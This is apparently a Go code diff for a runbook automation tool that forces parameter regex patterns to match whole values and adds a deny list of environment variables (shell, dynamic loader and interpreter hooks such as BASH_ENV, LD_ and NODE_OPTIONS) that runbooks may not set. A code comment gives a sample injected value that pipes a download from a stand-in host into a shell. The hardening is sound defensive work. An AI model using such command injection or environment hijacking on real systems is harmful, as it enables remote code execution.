@@ -5,6 +5,7 @@ import (
 	"math"
 	"regexp"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/peacedouts/nightfix/internal/expr"
@@ -88,7 +89,7 @@ func coerceParam(name string, p Param, v any) (any, error) {
 			return bad("value too long")
 		}
 		if p.Pattern != "" {
-			re, err := regexp.Compile(p.Pattern)
+			re, err := CompilePattern(p.Pattern)
 			if err != nil {
 				return bad("invalid pattern")
 			}
@@ -170,4 +171,29 @@ func toFloat(v any) float64 {
 		return f
 	}
 	return 0
+}
+
+// CompilePattern compiles a parameter pattern so it must match the whole
+// value. Patterns are a security control on alert-derived input, and a
+// substring match ("[a-z]+" matching "a; curl evil | sh") would defeat it.
+func CompilePattern(p string) (*regexp.Regexp, error) {
+	return regexp.Compile(`^(?:` + p + `)$`)
+}
+
+// ReservedEnv reports whether an env name may not be set by a runbook: the
+// agent's own variables, and names the shell or dynamic loader act on
+// (BASH_ENV, for one, is expanded and run before the script itself).
+func ReservedEnv(name string) bool {
+	switch name {
+	case "PATH", "HOME", "TMPDIR", "LANG", "IFS", "ENV", "SHELLOPTS", "BASHOPTS", "PS4", "PROMPT_COMMAND",
+		"CDPATH", "GLOBIGNORE", "POSIXLY_CORRECT", "PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME", "PERL5LIB", "PERL5OPT",
+		"RUBYOPT", "NODE_OPTIONS":
+		return true
+	}
+	for _, prefix := range []string{"BASH_", "LD_", "DYLD_"} {
+		if strings.HasPrefix(name, prefix) {
+			return true
+		}
+	}
+	return false
 }
